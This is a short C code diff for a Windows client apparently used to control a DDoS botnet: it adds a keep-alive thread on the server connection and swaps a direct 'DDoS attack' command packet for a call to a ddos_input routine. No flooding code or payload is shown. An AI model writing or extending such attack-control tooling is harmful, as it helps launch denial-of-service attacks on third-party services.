@@ -34,6 +34,22 @@ void is_connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
     } while(strcmp(is_conn, "n") != 0 && strcmp(is_conn, "N") != 0);
 }
 
+DWORD WINAPI KeepAliveThread(LPVOID lpParam) {
+    SOCKET sock = *(SOCKET*)lpParam;
+
+    while (1) {
+        Sleep(300000);
+
+        if (keep_alive(sock) < 0) {
+            break;
+        } else {
+            printf("\nKeep-alive sent.\n");
+        }
+    }
+
+    return 0;
+}
+
 int connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
     WSADATA wsaData;
     SOCKET sock;
@@ -73,15 +89,14 @@ int connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
         printf("Failed to hello send packet\n");
     }
 
+    CreateThread(NULL, 0, KeepAliveThread, &sock, 0, NULL);
+
     printf("\033[32mConnect to server %s:%d success!\033[0m\n", SERVER_ADDR, SERVER_PORT);
 
     uint8_t action = input(sock);
     switch (action) {
         case 1:
-            printf("Sending a packet at the beginning of a DDoS attack...\n");
-            if (command_packet(sock, ADMIN_PACKET_CTYPE_COMMAND_DDOS, NULL) < 0) {
-                printf("Failed to command ddos send packet\n");
-            }
+            ddos_input(sock);
         case 2:
             break;
         case 3:
